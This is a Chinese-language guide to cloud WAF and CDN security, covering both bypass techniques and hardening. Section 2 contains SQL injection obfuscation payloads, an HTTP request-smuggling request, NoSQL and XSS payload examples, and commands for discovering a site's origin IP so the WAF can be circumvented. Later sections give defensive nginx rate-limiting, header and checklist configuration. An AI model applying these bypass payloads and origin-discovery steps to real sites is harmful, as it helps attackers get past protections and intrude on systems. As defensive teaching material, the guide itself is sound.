# 云 WAF / CDN 安全配置与绕过技巧

---

## 一、WAF 工作原理与常见能力

云 WAF（Web Application Firewall）本质是**反向代理 + 规则引擎**，位于客户端与源站之间，对 HTTP(S) 流量做深度解析与策略匹配。

```
  Client ──▶ CDN ──▶ WAF ──▶ SLB ──▶ 源站(ECS/K8s/OSS)
              ▲        ▲
              │        │
         静态缓存    规则匹配 / Bot 识别 / CC 防护
```

### 1.1 WAF 能力矩阵

| 防护模块 | 作用 | 典型配置 |
|---------|------|---------|
| 基础规则 | 覆盖 OWASP Top 10 | SQLi / XSS / RCE / LFI / SSRF 规则集 |
| 语义分析 | 深度学习识别变形 Payload | 基于 AST + 词法分析 |
| Bot 管理 | 识别爬虫与自动化工具 | JS Challenge / CAPTCHA / UA 指纹 |
| CC 防护 | 高频请求限制 | IP/会话/URI 维度限流 |
| 精准访问控制 | 基于 IP / Geo / Header / Cookie | ACL 白黑名单 |
| 数据防泄漏 | 响应体中身份证、手机号、银行卡号脱敏 | 正则 + 掩码 |

## 二、WAF 常见绕过手法

### 2.1 基于协议/编码的绕过

```
SQLi 编码混淆示例（目标：绕过字符串匹配）：
  ?id=1 UnIoN SeLeCt 1,2,3--              大小写混写
  ?id=1/*!50000UnIoN*//*!SeLeCt*/1,2,3--  MySQL 注释注入
  ?id=1%25%32%37%25%32%37...              双重 URL 编码
  ?id=1%u0027%20or%u0031%u003d%u0031       Unicode 编码
  ?id=1' o\r\nr '1'='1                    空白字符变形
```

### 2.2 基于分块/协议的绕过

```http
# Content-Length 与 Transfer-Encoding 冲突（HTTP Smuggling）
POST /login HTTP/1.1
Host: victim.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### 2.3 基于数据格式的绕过

| 目标接口 | 绕过思路 | 示例 |
|---------|---------|------|
| JSON 接口 | JSON 嵌套 + 数组变形 | `{"id":{"$ne":1}}` / `id[]=1&id[]=2` |
| XML 接口 | XXE 外部实体 + 编码 | `<a>&#x3C;img src=x onerror=alert&#x3E;</a>` |
| multipart | 多 boundary、异常 content-type | form-data + application/json 混用 |
| 大文件上传 | 超大 body 导致 WAF 截断解析 | 10MB+ POST body，payload 放在末尾 |

### 2.4 基于源站泄露的绕过

```bash
# 通过历史 DNS、SSL 证书透明日志、FOFA/Censys 找源站 IP
amass intel -d victim.com
curl -H "Host: victim.com" http://<real-ip>/ --resolve "victim.com:80:<real-ip>"
# 直接访问真实源站可绕过 CDN/WAF 层
```

## 三、CDN 源站泄露常见路径

1. **历史 DNS 解析记录**：`securitytrails.com` / `viewdns.info` 查 A 记录变更
2. **证书透明度日志**：crt.sh 按域搜索，找到自签名 / 早期证书对应 IP
3. **邮件头 / RSS / API 误输出**：服务器内网真实 IP 写入 Received 头
4. **favicon hash 反查**：FOFA 通过 `icon_hash=` 指纹反查源站
5. **探针文件**：`/phpinfo.php`、`/server-status`、`/actuator/env`

```bash
# favicon hash 反查源站（Shodan / FOFA 语法）
curl -s https://cdn.victim.com/favicon.ico | md5sum
# 然后在 FOFA 搜索 icon_hash="xxxx" && country="CN"
```

## 四、CC / 高频攻击防护

```nginx
# 源站 Nginx 层兜底限流（当 CDN/WAF 被穿透时仍有效）
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $server_name$request_uri zone=per_uri:10m rate=100r/s;

server {
  location /api/login {
    limit_req zone=api burst=20 nodelay;
    limit_req_status 429;
  }
}
```

**WAF 层 CC 策略建议**：

| 场景 | 策略 |
|------|------|
| 登录接口 | 同一 IP 5 分钟内 10 次失败 → 人机验证；50 次失败 → 临时拉黑 |
| 短信接口 | 同一手机号 1 小时 3 次；同一 IP 1 小时 20 次 |
| 商品详情页 | 同一 UA / IP 超过 200 QPS → 验证码挑战 |
| API 接口 | 按 AppKey + IP 限流；结合业务签名防重放 |

## 五、WAF 防护策略加固

### 5.1 推荐防御深度

```yaml
Layer 1 - CDN:       静态加速 + Referer 防盗链 + TLS 1.2+ 强加密套件
Layer 2 - 云 WAF:    规则引擎 + Bot 管理 + CC + 精准 ACL
Layer 3 - 源站网关:  Nginx ModSecurity / Kong OpenPolicyAgent
Layer 4 - 应用代码:  参数校验 + ORM 预编译 + CSP Header
```

### 5.2 关键 Header 配置

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Content-Type-Options nosniff;
add_header X-Frame-Options SAMEORIGIN;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-${request_id}'";
add_header Referrer-Policy strict-origin-when-cross-origin;
```

### 5.3 真实 IP 传递链

```nginx
# 务必正确配置 X-Forwarded-For / X-Real-IP 接收链
# 否则 WAF/源站看到的是 CDN 节点 IP，无法做 IP 维度拦截
set_real_ip_from 100.64.0.0/10;   # CDN 回源段
real_ip_header X-Forwarded-For;
real_ip_recursive on;
```

## 六、实战防守 CheckList

- [ ] 源站只放通 CDN/WAF 回源 CIDR，拒绝任何外部直连 IP
- [ ] WAF 规则级别：严格模式 + 观察期 → 阻断模式
- [ ] 登录 / 注册 / 短信 / 验证码接口开启 Bot 管理 + 人机验证
- [ ] 源站开启 ModSecurity + OWASP Core Rule Set 兜底
- [ ] 定期使用 nuclei / XRAY / SQLMap 自检测试 WAF 防护效果
- [ ] 监控 CDN 源站命中率；命中率突降 → 可能源站已泄露
- [ ] TLS 配置禁用 SSLv3/TLS1.0/TLS1.1，强套件 ECDHE+AES-GCM
- [ ] HTTP/2 + HSTS preload 启用
